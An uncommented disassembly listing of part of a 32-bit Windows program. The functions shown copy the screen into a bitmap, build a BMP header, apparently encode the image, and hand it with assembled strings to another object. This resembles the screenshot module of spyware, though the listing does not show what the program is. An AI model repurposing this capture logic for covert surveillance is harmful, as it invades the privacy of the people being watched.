  40d685:	e8 05 00 00 00       	call   0x40d68f
  40d68a:	e9 0d 00 00 00       	jmp    0x40d69c
  40d68f:	6a 00                	push   $0x0
  40d691:	b9 c0 5a 41 00       	mov    $0x415ac0,%ecx
  40d696:	e8 46 4a ff ff       	call   0x4020e1
  40d69b:	c3                   	ret
  40d69c:	68 a8 d6 40 00       	push   $0x40d6a8
  40d6a1:	e8 14 26 00 00       	call   0x40fcba
  40d6a6:	59                   	pop    %ecx
  40d6a7:	c3                   	ret
  40d6a8:	b9 c0 5a 41 00       	mov    $0x415ac0,%ecx
  40d6ad:	e9 24 4b ff ff       	jmp    0x4021d6
  40d6b2:	e8 05 00 00 00       	call   0x40d6bc
  40d6b7:	e9 15 00 00 00       	jmp    0x40d6d1
  40d6bc:	55                   	push   %ebp
  40d6bd:	8b ec                	mov    %esp,%ebp
  40d6bf:	51                   	push   %ecx
  40d6c0:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40d6c3:	b9 08 5b 41 00       	mov    $0x415b08,%ecx
  40d6c8:	50                   	push   %eax
  40d6c9:	ff 15 50 02 41 00    	call   *0x410250
  40d6cf:	c9                   	leave
  40d6d0:	c3                   	ret
  40d6d1:	68 dd d6 40 00       	push   $0x40d6dd
  40d6d6:	e8 df 25 00 00       	call   0x40fcba
  40d6db:	59                   	pop    %ecx
  40d6dc:	c3                   	ret
  40d6dd:	b9 08 5b 41 00       	mov    $0x415b08,%ecx
  40d6e2:	ff 25 54 02 41 00    	jmp    *0x410254
  40d6e8:	e8 05 00 00 00       	call   0x40d6f2
  40d6ed:	e9 15 00 00 00       	jmp    0x40d707
  40d6f2:	55                   	push   %ebp
  40d6f3:	8b ec                	mov    %esp,%ebp
  40d6f5:	51                   	push   %ecx
  40d6f6:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40d6f9:	b9 18 5b 41 00       	mov    $0x415b18,%ecx
  40d6fe:	50                   	push   %eax
  40d6ff:	ff 15 50 02 41 00    	call   *0x410250
  40d705:	c9                   	leave
  40d706:	c3                   	ret
  40d707:	68 13 d7 40 00       	push   $0x40d713
  40d70c:	e8 a9 25 00 00       	call   0x40fcba
  40d711:	59                   	pop    %ecx
  40d712:	c3                   	ret
  40d713:	b9 18 5b 41 00       	mov    $0x415b18,%ecx
  40d718:	ff 25 54 02 41 00    	jmp    *0x410254
  40d71e:	55                   	push   %ebp
  40d71f:	8b ec                	mov    %esp,%ebp
  40d721:	83 ec 5c             	sub    $0x5c,%esp
  40d724:	53                   	push   %ebx
  40d725:	56                   	push   %esi
  40d726:	57                   	push   %edi
  40d727:	33 ff                	xor    %edi,%edi
  40d729:	57                   	push   %edi
  40d72a:	57                   	push   %edi
  40d72b:	57                   	push   %edi
  40d72c:	68 d4 17 41 00       	push   $0x4117d4
  40d731:	ff 15 40 00 41 00    	call   *0x410040
  40d737:	8b d8                	mov    %eax,%ebx
  40d739:	53                   	push   %ebx
  40d73a:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  40d73d:	ff 15 44 00 41 00    	call   *0x410044
  40d743:	8b 35 48 00 41 00    	mov    0x410048,%esi
  40d749:	6a 08                	push   $0x8
  40d74b:	53                   	push   %ebx
  40d74c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40d74f:	ff d6                	call   *%esi
  40d751:	6a 0a                	push   $0xa
  40d753:	53                   	push   %ebx
  40d754:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40d757:	ff d6                	call   *%esi
  40d759:	8b f0                	mov    %eax,%esi
  40d75b:	56                   	push   %esi
  40d75c:	ff 75 f4             	push   -0xc(%ebp)
  40d75f:	53                   	push   %ebx
  40d760:	ff 15 4c 00 41 00    	call   *0x41004c
  40d766:	3b c7                	cmp    %edi,%eax
  40d768:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40d76b:	75 08                	jne    0x40d775
  40d76d:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40d770:	e9 38 01 00 00       	jmp    0x40d8ad
  40d775:	50                   	push   %eax
  40d776:	ff 75 f8             	push   -0x8(%ebp)
  40d779:	ff 15 50 00 41 00    	call   *0x410050
  40d77f:	85 c0                	test   %eax,%eax
  40d781:	75 08                	jne    0x40d78b
  40d783:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40d786:	e9 22 01 00 00       	jmp    0x40d8ad
  40d78b:	68 20 00 cc 00       	push   $0xcc0020
  40d790:	56                   	push   %esi
  40d791:	ff 75 f4             	push   -0xc(%ebp)
  40d794:	57                   	push   %edi
  40d795:	57                   	push   %edi
  40d796:	53                   	push   %ebx
  40d797:	56                   	push   %esi
  40d798:	ff 75 f4             	push   -0xc(%ebp)
  40d79b:	57                   	push   %edi
  40d79c:	57                   	push   %edi
  40d79d:	ff 75 f8             	push   -0x8(%ebp)
  40d7a0:	ff 15 54 00 41 00    	call   *0x410054
  40d7a6:	85 c0                	test   %eax,%eax
  40d7a8:	75 08                	jne    0x40d7b2
  40d7aa:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40d7ad:	e9 fb 00 00 00       	jmp    0x40d8ad
  40d7b2:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40d7b5:	50                   	push   %eax
  40d7b6:	6a 18                	push   $0x18
  40d7b8:	ff 75 f0             	push   -0x10(%ebp)
  40d7bb:	ff 15 58 00 41 00    	call   *0x410058
  40d7c1:	85 c0                	test   %eax,%eax
  40d7c3:	75 08                	jne    0x40d7cd
  40d7c5:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40d7c8:	e9 e0 00 00 00       	jmp    0x40d8ad
  40d7cd:	8b 45 b6             	mov    -0x4a(%ebp),%eax
  40d7d0:	0f af 45 b4          	imul   -0x4c(%ebp),%eax
  40d7d4:	66 3d 01 00          	cmp    $0x1,%ax
  40d7d8:	75 07                	jne    0x40d7e1
  40d7da:	6a 01                	push   $0x1
  40d7dc:	e9 9b 00 00 00       	jmp    0x40d87c
  40d7e1:	6a 04                	push   $0x4
  40d7e3:	5b                   	pop    %ebx
  40d7e4:	66 3b c3             	cmp    %bx,%ax
  40d7e7:	0f 86 90 00 00 00    	jbe    0x40d87d
  40d7ed:	6a 08                	push   $0x8
  40d7ef:	5b                   	pop    %ebx
  40d7f0:	66 3b c3             	cmp    %bx,%ax
  40d7f3:	0f 86 84 00 00 00    	jbe    0x40d87d
  40d7f9:	6a 10                	push   $0x10
  40d7fb:	5b                   	pop    %ebx
  40d7fc:	66 3b c3             	cmp    %bx,%ax
  40d7ff:	76 7c                	jbe    0x40d87d
  40d801:	66 3d 18 00          	cmp    $0x18,%ax
  40d805:	77 73                	ja     0x40d87a
  40d807:	6a 18                	push   $0x18
  40d809:	5b                   	pop    %ebx
  40d80a:	6a 28                	push   $0x28
  40d80c:	6a 40                	push   $0x40
  40d80e:	ff 15 fc 00 41 00    	call   *0x4100fc
  40d814:	8b f0                	mov    %eax,%esi
  40d816:	66 83 fb 18          	cmp    $0x18,%bx
  40d81a:	c7 06 28 00 00 00    	movl   $0x28,(%esi)
  40d820:	8b 45 a8             	mov    -0x58(%ebp),%eax
  40d823:	89 46 04             	mov    %eax,0x4(%esi)
  40d826:	8b 45 ac             	mov    -0x54(%ebp),%eax
  40d829:	89 46 08             	mov    %eax,0x8(%esi)
  40d82c:	66 8b 45 b4          	mov    -0x4c(%ebp),%ax
  40d830:	66 89 46 0c          	mov    %ax,0xc(%esi)
  40d834:	66 8b 45 b6          	mov    -0x4a(%ebp),%ax
  40d838:	66 89 46 0e          	mov    %ax,0xe(%esi)
  40d83c:	73 0a                	jae    0x40d848
  40d83e:	6a 01                	push   $0x1
  40d840:	8a cb                	mov    %bl,%cl
  40d842:	58                   	pop    %eax
  40d843:	d3 e0                	shl    %cl,%eax
  40d845:	89 46 20             	mov    %eax,0x20(%esi)
  40d848:	8b 46 04             	mov    0x4(%esi),%eax
  40d84b:	6a 08                	push   $0x8
  40d84d:	83 c0 07             	add    $0x7,%eax
  40d850:	59                   	pop    %ecx
  40d851:	99                   	cltd
  40d852:	f7 f9                	idiv   %ecx
  40d854:	0f b7 cb             	movzwl %bx,%ecx
  40d857:	89 7e 10             	mov    %edi,0x10(%esi)
  40d85a:	89 7e 24             	mov    %edi,0x24(%esi)
  40d85d:	0f af c1             	imul   %ecx,%eax
  40d860:	0f af 46 08          	imul   0x8(%esi),%eax
  40d864:	50                   	push   %eax
  40d865:	57                   	push   %edi
  40d866:	89 46 14             	mov    %eax,0x14(%esi)
  40d869:	ff 15 bc 00 41 00    	call   *0x4100bc
  40d86f:	8b d8                	mov    %eax,%ebx
  40d871:	3b df                	cmp    %edi,%ebx
  40d873:	75 1c                	jne    0x40d891
  40d875:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40d878:	eb 33                	jmp    0x40d8ad
  40d87a:	6a 20                	push   $0x20
  40d87c:	5b                   	pop    %ebx
  40d87d:	6a 01                	push   $0x1
  40d87f:	8a cb                	mov    %bl,%cl
  40d881:	58                   	pop    %eax
  40d882:	d3 e0                	shl    %cl,%eax
  40d884:	8d 04 85 28 00 00 00 	lea    0x28(,%eax,4),%eax
  40d88b:	50                   	push   %eax
  40d88c:	e9 7b ff ff ff       	jmp    0x40d80c
  40d891:	0f b7 46 08          	movzwl 0x8(%esi),%eax
  40d895:	57                   	push   %edi
  40d896:	56                   	push   %esi
  40d897:	53                   	push   %ebx
  40d898:	50                   	push   %eax
  40d899:	57                   	push   %edi
  40d89a:	ff 75 f0             	push   -0x10(%ebp)
  40d89d:	ff 75 f8             	push   -0x8(%ebp)
  40d8a0:	ff 15 5c 00 41 00    	call   *0x41005c
  40d8a6:	85 c0                	test   %eax,%eax
  40d8a8:	75 13                	jne    0x40d8bd
  40d8aa:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40d8ad:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40d8b0:	50                   	push   %eax
  40d8b1:	57                   	push   %edi
  40d8b2:	ff 15 4c 02 41 00    	call   *0x41024c
  40d8b8:	e9 d4 00 00 00       	jmp    0x40d991
  40d8bd:	66 c7 45 dc 42 4d    	movw   $0x4d42,-0x24(%ebp)
  40d8c3:	8b 46 20             	mov    0x20(%esi),%eax
  40d8c6:	8b 4e 14             	mov    0x14(%esi),%ecx
  40d8c9:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  40d8cc:	8b 0e                	mov    (%esi),%ecx
  40d8ce:	66 89 7d e2          	mov    %di,-0x1e(%ebp)
  40d8d2:	66 89 7d e4          	mov    %di,-0x1c(%ebp)
  40d8d6:	8d 44 08 0e          	lea    0xe(%eax,%ecx,1),%eax
  40d8da:	89 45 de             	mov    %eax,-0x22(%ebp)
  40d8dd:	8b 46 20             	mov    0x20(%esi),%eax
  40d8e0:	8b 0e                	mov    (%esi),%ecx
  40d8e2:	8d 44 81 0e          	lea    0xe(%ecx,%eax,4),%eax
  40d8e6:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40d8e9:	89 45 e6             	mov    %eax,-0x1a(%ebp)
  40d8ec:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40d8ef:	50                   	push   %eax
  40d8f0:	ff 15 50 02 41 00    	call   *0x410250
  40d8f6:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40d8f9:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40d8fc:	50                   	push   %eax
  40d8fd:	ff 15 50 02 41 00    	call   *0x410250
  40d903:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40d906:	6a 0e                	push   $0xe
  40d908:	50                   	push   %eax
  40d909:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40d90c:	ff 15 18 02 41 00    	call   *0x410218
  40d912:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40d915:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40d918:	50                   	push   %eax
  40d919:	ff 15 94 02 41 00    	call   *0x410294
  40d91f:	6a 28                	push   $0x28
  40d921:	56                   	push   %esi
  40d922:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40d925:	ff 15 18 02 41 00    	call   *0x410218
  40d92b:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40d92e:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40d931:	50                   	push   %eax
  40d932:	ff 15 94 02 41 00    	call   *0x410294
  40d938:	ff 76 14             	push   0x14(%esi)
  40d93b:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40d93e:	53                   	push   %ebx
  40d93f:	ff 15 18 02 41 00    	call   *0x410218
  40d945:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40d948:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40d94b:	50                   	push   %eax
  40d94c:	ff 15 94 02 41 00    	call   *0x410294
  40d952:	ff 75 f0             	push   -0x10(%ebp)
  40d955:	ff 15 60 00 41 00    	call   *0x410060
  40d95b:	53                   	push   %ebx
  40d95c:	ff 15 f8 00 41 00    	call   *0x4100f8
  40d962:	ff 75 ec             	push   -0x14(%ebp)
  40d965:	8b 35 64 00 41 00    	mov    0x410064,%esi
  40d96b:	ff d6                	call   *%esi
  40d96d:	ff 75 f8             	push   -0x8(%ebp)
  40d970:	ff d6                	call   *%esi
  40d972:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40d975:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40d978:	50                   	push   %eax
  40d979:	ff 15 60 02 41 00    	call   *0x410260
  40d97f:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40d982:	ff 15 54 02 41 00    	call   *0x410254
  40d988:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40d98b:	ff 15 54 02 41 00    	call   *0x410254
  40d991:	8b 45 08             	mov    0x8(%ebp),%eax
  40d994:	5f                   	pop    %edi
  40d995:	5e                   	pop    %esi
  40d996:	5b                   	pop    %ebx
  40d997:	c9                   	leave
  40d998:	c3                   	ret
  40d999:	55                   	push   %ebp
  40d99a:	8b ec                	mov    %esp,%ebp
  40d99c:	83 ec 0c             	sub    $0xc,%esp
  40d99f:	53                   	push   %ebx
  40d9a0:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40d9a3:	56                   	push   %esi
  40d9a4:	50                   	push   %eax
  40d9a5:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40d9a8:	33 f6                	xor    %esi,%esi
  40d9aa:	50                   	push   %eax
  40d9ab:	89 75 f4             	mov    %esi,-0xc(%ebp)
  40d9ae:	89 75 f8             	mov    %esi,-0x8(%ebp)
  40d9b1:	e8 7c 00 00 00       	call   0x40da32
  40d9b6:	39 75 f8             	cmp    %esi,-0x8(%ebp)
  40d9b9:	59                   	pop    %ecx
  40d9ba:	59                   	pop    %ecx
  40d9bb:	74 10                	je     0x40d9cd
  40d9bd:	ff 75 f8             	push   -0x8(%ebp)
  40d9c0:	ff 15 7c 03 41 00    	call   *0x41037c
  40d9c6:	8b d8                	mov    %eax,%ebx
  40d9c8:	59                   	pop    %ecx
  40d9c9:	3b de                	cmp    %esi,%ebx
  40d9cb:	75 05                	jne    0x40d9d2
  40d9cd:	83 c8 ff             	or     $0xffffffff,%eax
  40d9d0:	eb 46                	jmp    0x40da18
  40d9d2:	53                   	push   %ebx
  40d9d3:	ff 75 f8             	push   -0x8(%ebp)
  40d9d6:	ff 75 f4             	push   -0xc(%ebp)
  40d9d9:	e8 64 00 00 00       	call   0x40da42
  40d9de:	83 c4 0c             	add    $0xc,%esp
  40d9e1:	39 75 f4             	cmp    %esi,-0xc(%ebp)
  40d9e4:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40d9e7:	76 22                	jbe    0x40da0b
  40d9e9:	8d 73 30             	lea    0x30(%ebx),%esi
  40d9ec:	ff 75 08             	push   0x8(%ebp)
  40d9ef:	ff 36                	push   (%esi)
  40d9f1:	ff 15 70 03 41 00    	call   *0x410370
  40d9f7:	59                   	pop    %ecx
  40d9f8:	85 c0                	test   %eax,%eax
  40d9fa:	59                   	pop    %ecx
  40d9fb:	74 1f                	je     0x40da1c
  40d9fd:	ff 45 fc             	incl   -0x4(%ebp)
  40da00:	83 c6 4c             	add    $0x4c,%esi
  40da03:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40da06:	3b 45 f4             	cmp    -0xc(%ebp),%eax
  40da09:	72 e1                	jb     0x40d9ec
  40da0b:	83 ce ff             	or     $0xffffffff,%esi
  40da0e:	53                   	push   %ebx
  40da0f:	ff 15 80 03 41 00    	call   *0x410380
  40da15:	59                   	pop    %ecx
  40da16:	8b c6                	mov    %esi,%eax
  40da18:	5e                   	pop    %esi
  40da19:	5b                   	pop    %ebx
  40da1a:	c9                   	leave
  40da1b:	c3                   	ret
  40da1c:	8b 75 fc             	mov    -0x4(%ebp),%esi
  40da1f:	57                   	push   %edi
  40da20:	6b f6 4c             	imul   $0x4c,%esi,%esi
  40da23:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40da26:	03 f3                	add    %ebx,%esi
  40da28:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40da29:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40da2a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40da2b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40da2c:	8b 75 fc             	mov    -0x4(%ebp),%esi
  40da2f:	5f                   	pop    %edi
  40da30:	eb dc                	jmp    0x40da0e
  40da32:	55                   	push   %ebp
  40da33:	8b ec                	mov    %esp,%ebp
  40da35:	ff 75 0c             	push   0xc(%ebp)
  40da38:	ff 75 08             	push   0x8(%ebp)
  40da3b:	e8 1c 25 00 00       	call   0x40ff5c
  40da40:	5d                   	pop    %ebp
  40da41:	c3                   	ret
  40da42:	55                   	push   %ebp
  40da43:	8b ec                	mov    %esp,%ebp
  40da45:	ff 75 10             	push   0x10(%ebp)
  40da48:	ff 75 0c             	push   0xc(%ebp)
  40da4b:	ff 75 08             	push   0x8(%ebp)
  40da4e:	e8 0f 25 00 00       	call   0x40ff62
  40da53:	5d                   	pop    %ebp
  40da54:	c3                   	ret
  40da55:	55                   	push   %ebp
  40da56:	8b ec                	mov    %esp,%ebp
  40da58:	81 ec 0c 01 00 00    	sub    $0x10c,%esp
  40da5e:	53                   	push   %ebx
  40da5f:	33 db                	xor    %ebx,%ebx
  40da61:	39 1d bc 5a 41 00    	cmp    %ebx,0x415abc
  40da67:	56                   	push   %esi
  40da68:	57                   	push   %edi
  40da69:	75 1a                	jne    0x40da85
  40da6b:	53                   	push   %ebx
  40da6c:	53                   	push   %ebx
  40da6d:	53                   	push   %ebx
  40da6e:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40da71:	e8 ab 02 00 00       	call   0x40dd21
  40da76:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40da79:	53                   	push   %ebx
  40da7a:	50                   	push   %eax
  40da7b:	68 bc 5a 41 00       	push   $0x415abc
  40da80:	e8 e3 24 00 00       	call   0x40ff68
  40da85:	39 1d b8 5a 41 00    	cmp    %ebx,0x415ab8
  40da8b:	75 19                	jne    0x40daa6
  40da8d:	6a 0c                	push   $0xc
  40da8f:	68 7c 12 41 00       	push   $0x41127c
  40da94:	ff 15 40 01 41 00    	call   *0x410140
  40da9a:	50                   	push   %eax
  40da9b:	ff 15 44 01 41 00    	call   *0x410144
  40daa1:	a3 b8 5a 41 00       	mov    %eax,0x415ab8
  40daa6:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40daa9:	50                   	push   %eax
  40daaa:	e8 6f fc ff ff       	call   0x40d71e
  40daaf:	59                   	pop    %ecx
  40dab0:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40dab3:	ff 15 90 02 41 00    	call   *0x410290
  40dab9:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40dabc:	ff 15 90 02 41 00    	call   *0x410290
  40dac2:	50                   	push   %eax
  40dac3:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40dac6:	ff 15 58 02 41 00    	call   *0x410258
  40dacc:	50                   	push   %eax
  40dacd:	ff 15 b8 5a 41 00    	call   *0x415ab8
  40dad3:	53                   	push   %ebx
  40dad4:	50                   	push   %eax
  40dad5:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  40dadb:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40dade:	e8 5f 02 00 00       	call   0x40dd42
  40dae3:	8d 85 4c ff ff ff    	lea    -0xb4(%ebp),%eax
  40dae9:	50                   	push   %eax
  40daea:	68 e4 17 41 00       	push   $0x4117e4
  40daef:	e8 a5 fe ff ff       	call   0x40d999
  40daf4:	59                   	pop    %ecx
  40daf5:	be 24 19 41 00       	mov    $0x411924,%esi
  40dafa:	59                   	pop    %ecx
  40dafb:	8d bd 60 ff ff ff    	lea    -0xa0(%ebp),%edi
  40db01:	6a 01                	push   $0x1
  40db03:	58                   	pop    %eax
  40db04:	89 85 5c ff ff ff    	mov    %eax,-0xa4(%ebp)
  40db0a:	53                   	push   %ebx
  40db0b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40db0c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40db0d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40db0e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40db0f:	89 85 70 ff ff ff    	mov    %eax,-0x90(%ebp)
  40db15:	8d 45 08             	lea    0x8(%ebp),%eax
  40db18:	53                   	push   %ebx
  40db19:	c7 85 74 ff ff ff 04 	movl   $0x4,-0x8c(%ebp)
  40db20:	00 00 00 
  40db23:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  40db29:	ff 15 b8 5a 41 00    	call   *0x415ab8
  40db2f:	8b f0                	mov    %eax,%esi
  40db31:	8d 85 5c ff ff ff    	lea    -0xa4(%ebp),%eax
  40db37:	50                   	push   %eax
  40db38:	8d 85 4c ff ff ff    	lea    -0xb4(%ebp),%eax
  40db3e:	50                   	push   %eax
  40db3f:	56                   	push   %esi
  40db40:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  40db46:	e8 c6 02 00 00       	call   0x40de11
  40db4b:	8b 06                	mov    (%esi),%eax
  40db4d:	8d 8d f4 fe ff ff    	lea    -0x10c(%ebp),%ecx
  40db53:	6a 01                	push   $0x1
  40db55:	51                   	push   %ecx
  40db56:	56                   	push   %esi
  40db57:	ff 50 30             	call   *0x30(%eax)
  40db5a:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40db5d:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  40db60:	50                   	push   %eax
  40db61:	53                   	push   %ebx
  40db62:	ff b5 fc fe ff ff    	push   -0x104(%ebp)
  40db68:	ff 15 24 02 41 00    	call   *0x410224
  40db6e:	8b 0e                	mov    (%esi),%ecx
  40db70:	53                   	push   %ebx
  40db71:	33 c0                	xor    %eax,%eax
  40db73:	53                   	push   %ebx
  40db74:	53                   	push   %ebx
  40db75:	50                   	push   %eax
  40db76:	56                   	push   %esi
  40db77:	ff 51 14             	call   *0x14(%ecx)
  40db7a:	8b 3e                	mov    (%esi),%edi
  40db7c:	53                   	push   %ebx
  40db7d:	ff b5 fc fe ff ff    	push   -0x104(%ebp)
  40db83:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  40db86:	ff 15 58 02 41 00    	call   *0x410258
  40db8c:	50                   	push   %eax
  40db8d:	56                   	push   %esi
  40db8e:	ff 57 0c             	call   *0xc(%edi)
  40db91:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40db94:	50                   	push   %eax
  40db95:	8b 08                	mov    (%eax),%ecx
  40db97:	ff 51 08             	call   *0x8(%ecx)
  40db9a:	8b 06                	mov    (%esi),%eax
  40db9c:	56                   	push   %esi
  40db9d:	ff 50 08             	call   *0x8(%eax)
  40dba0:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40dba3:	6a 0a                	push   $0xa
  40dba5:	50                   	push   %eax
  40dba6:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  40dba9:	ff 15 90 02 41 00    	call   *0x410290
  40dbaf:	50                   	push   %eax
  40dbb0:	ff 15 5c 03 41 00    	call   *0x41035c
  40dbb6:	83 c4 0c             	add    $0xc,%esp
  40dbb9:	39 1d c0 5a 41 00    	cmp    %ebx,0x415ac0
  40dbbf:	0f 85 cc 00 00 00    	jne    0x40dc91
  40dbc5:	bb c0 5a 41 00       	mov    $0x415ac0,%ebx
  40dbca:	8b cb                	mov    %ebx,%ecx
  40dbcc:	e8 38 45 ff ff       	call   0x402109
  40dbd1:	83 ec 10             	sub    $0x10,%esp
  40dbd4:	be 78 52 41 00       	mov    $0x415278,%esi
  40dbd9:	8b fc                	mov    %esp,%edi
  40dbdb:	8b cb                	mov    %ebx,%ecx
  40dbdd:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40dbde:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40dbdf:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40dbe0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40dbe1:	e8 82 45 ff ff       	call   0x402168
  40dbe6:	68 63 de 40 00       	push   $0x40de63
  40dbeb:	8b cb                	mov    %ebx,%ecx
  40dbed:	e8 f9 45 ff ff       	call   0x4021eb
  40dbf2:	83 ec 10             	sub    $0x10,%esp
  40dbf5:	b8 68 52 41 00       	mov    $0x415268,%eax
  40dbfa:	8b f4                	mov    %esp,%esi
  40dbfc:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  40dbff:	68 18 5b 41 00       	push   $0x415b18
  40dc04:	50                   	push   %eax
  40dc05:	51                   	push   %ecx
  40dc06:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40dc09:	50                   	push   %eax
  40dc0a:	51                   	push   %ecx
  40dc0b:	50                   	push   %eax
  40dc0c:	8d 45 8c             	lea    -0x74(%ebp),%eax
  40dc0f:	68 40 15 41 00       	push   $0x411540
  40dc14:	50                   	push   %eax
  40dc15:	e8 00 20 00 00       	call   0x40fc1a
  40dc1a:	83 c4 0c             	add    $0xc,%esp
  40dc1d:	50                   	push   %eax
  40dc1e:	8d 45 9c             	lea    -0x64(%ebp),%eax
  40dc21:	50                   	push   %eax
  40dc22:	e8 f9 1f 00 00       	call   0x40fc20
  40dc27:	83 c4 0c             	add    $0xc,%esp
  40dc2a:	50                   	push   %eax
  40dc2b:	8d 45 ac             	lea    -0x54(%ebp),%eax
  40dc2e:	50                   	push   %eax
  40dc2f:	e8 e0 1f 00 00       	call   0x40fc14
  40dc34:	83 c4 0c             	add    $0xc,%esp
  40dc37:	50                   	push   %eax
  40dc38:	8d 85 3c ff ff ff    	lea    -0xc4(%ebp),%eax
  40dc3e:	50                   	push   %eax
  40dc3f:	e8 d0 1f 00 00       	call   0x40fc14
  40dc44:	83 c4 0c             	add    $0xc,%esp
  40dc47:	50                   	push   %eax
  40dc48:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40dc4b:	50                   	push   %eax
  40dc4c:	e8 c3 1f 00 00       	call   0x40fc14
  40dc51:	83 c4 0c             	add    $0xc,%esp
  40dc54:	50                   	push   %eax
  40dc55:	56                   	push   %esi
  40dc56:	e8 b9 1f 00 00       	call   0x40fc14
  40dc5b:	83 c4 0c             	add    $0xc,%esp
  40dc5e:	8b cb                	mov    %ebx,%ecx
  40dc60:	e8 33 45 ff ff       	call   0x402198
  40dc65:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40dc68:	ff 15 54 02 41 00    	call   *0x410254
  40dc6e:	8d 8d 3c ff ff ff    	lea    -0xc4(%ebp),%ecx
  40dc74:	ff 15 54 02 41 00    	call   *0x410254
  40dc7a:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  40dc7d:	ff 15 54 02 41 00    	call   *0x410254
  40dc83:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  40dc86:	ff 15 54 02 41 00    	call   *0x410254
  40dc8c:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  40dc8f:	eb 68                	jmp    0x40dcf9
  40dc91:	83 ec 10             	sub    $0x10,%esp
  40dc94:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40dc97:	8b f4                	mov    %esp,%esi
  40dc99:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40dc9c:	50                   	push   %eax
  40dc9d:	b8 68 52 41 00       	mov    $0x415268,%eax
  40dca2:	50                   	push   %eax
  40dca3:	51                   	push   %ecx
  40dca4:	50                   	push   %eax
  40dca5:	8d 45 ac             	lea    -0x54(%ebp),%eax
  40dca8:	68 dc 17 41 00       	push   $0x4117dc
  40dcad:	50                   	push   %eax
  40dcae:	e8 67 1f 00 00       	call   0x40fc1a
  40dcb3:	83 c4 0c             	add    $0xc,%esp
  40dcb6:	50                   	push   %eax
  40dcb7:	8d 45 9c             	lea    -0x64(%ebp),%eax
  40dcba:	50                   	push   %eax
  40dcbb:	e8 60 1f 00 00       	call   0x40fc20
  40dcc0:	83 c4 0c             	add    $0xc,%esp
  40dcc3:	50                   	push   %eax
  40dcc4:	8d 45 8c             	lea    -0x74(%ebp),%eax
  40dcc7:	50                   	push   %eax
  40dcc8:	e8 47 1f 00 00       	call   0x40fc14
  40dccd:	83 c4 0c             	add    $0xc,%esp
  40dcd0:	50                   	push   %eax
  40dcd1:	56                   	push   %esi
  40dcd2:	e8 3d 1f 00 00       	call   0x40fc14
  40dcd7:	83 c4 0c             	add    $0xc,%esp
  40dcda:	b9 c0 5a 41 00       	mov    $0x415ac0,%ecx
  40dcdf:	e8 b4 44 ff ff       	call   0x402198
  40dce4:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  40dce7:	ff 15 54 02 41 00    	call   *0x410254
  40dced:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  40dcf0:	ff 15 54 02 41 00    	call   *0x410254
